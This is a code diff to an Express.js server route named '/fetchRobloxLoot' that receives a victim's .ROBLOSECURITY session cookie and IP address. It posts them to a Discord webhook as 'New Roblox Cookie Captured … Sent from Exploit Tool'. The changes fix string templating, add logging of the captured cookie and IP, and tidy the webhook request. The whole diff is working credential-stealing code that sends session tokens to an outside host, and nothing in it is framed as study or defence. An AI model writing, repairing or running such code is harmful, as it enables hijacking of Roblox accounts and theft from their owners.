@@ -19,20 +19,23 @@ app.get("/fetchRobloxLoot", async (req, res) => {
     return res.status(400).json({ success: false, error: "❌ Invalid or missing .ROBLOSECURITY cookie" });
   }
 
+  // Debug logging
+  console.log("Received cookie:", cookie.slice(0, 40) + "..."); // Partial for safety
+  console.log("Received IP:", ip);
+
   try {
     const now = new Date().toLocaleString();
 
-    // Send everything as plain text inside the content
     const content = [
       "🔑 New Roblox Cookie Captured",
       "",
-      '📡 IP Address: ${ip || "Unknown"}',
-      '🕓 Time: ${now}',
+      `📡 IP Address: ${ip || "Unknown"}`,
+      `🕓 Time: ${now}`,
       "",
       "🧩 .ROBLOSECURITY:",
-      "",
+      "```",
       cookie,
-      "",
+      "```",
       "",
       "Sent from Exploit Tool"
     ].join("\n");
@@ -40,18 +43,21 @@ app.get("/fetchRobloxLoot", async (req, res) => {
     const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-body: JSON.stringify({
-  username: "Roblox Logger",
-  content: content // ✅ only this, no embeds
-})
+      body: JSON.stringify({
+        username: "Roblox Logger",
+        content: content
+      })
     });
 
     if (!discordRes.ok) {
+      console.error("Failed to send to Discord. Status:", discordRes.status);
       return res.status(500).json({ success: false, error: "❌ Failed to send to Discord webhook" });
     }
 
     return res.json({ success: true, message: "✅ Cookie sent to Discord!" });
+
   } catch (e) {
+    console.error("SERVER ERROR:", e);
     return res.status(500).json({ success: false, error: e.message });
   }
 });
